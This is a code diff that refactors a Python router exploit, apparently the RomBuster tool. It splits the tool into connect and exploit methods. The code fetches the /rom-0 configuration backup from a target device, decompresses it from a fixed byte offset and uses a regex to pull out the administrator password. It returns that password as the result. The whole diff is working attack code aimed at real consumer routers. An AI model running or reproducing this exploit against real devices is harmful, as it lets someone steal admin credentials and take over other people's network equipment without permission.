@@ -27,31 +27,26 @@
 import re
 import requests
 
-from deps.lzs_decompress import LZSDecompress
-from core.badges import Badges
+from .deps.lzs_decompress import LZSDecompress, RingList
 
 
-class Exploit(Badges):
-    credentials = list()
-
-    def exploit(self, host):
-        self.print_process(f"({host}) - exploiting ...")
+class RomBuster:
+    def connect(self, host):
         try:
             response = requests.get(f"http://{host}/rom-0", verify=False, timeout=1)
         except Exception:
-            self.print_error(f"({host}) - not vulnerable!")
-            return
+            return None
+        return response
 
-        self.print_process(f"({host}) - extracting password ...")
+    def exploit(self, response):
         if response.status_code == 200:
             data = response.content[8568:]
             result, window = LZSDecompress(data, RingList(2048))
 
             password = re.findall("([\040-\176]{5,})", result)
-            if password[0]:
-                self.print_success(f"({host}) - vulnerable!")
-                self.credentials.append(f"{host}:admin:{password}")
+            if len(password):
+                return {'admin': password[0]}
             else:
-                self.print_warning(f"({host}) - vulnerable, but no password obtained.")
+                return None
         else:
-            self.print_error(f"({host}) - not vulnerable!")
+            return None
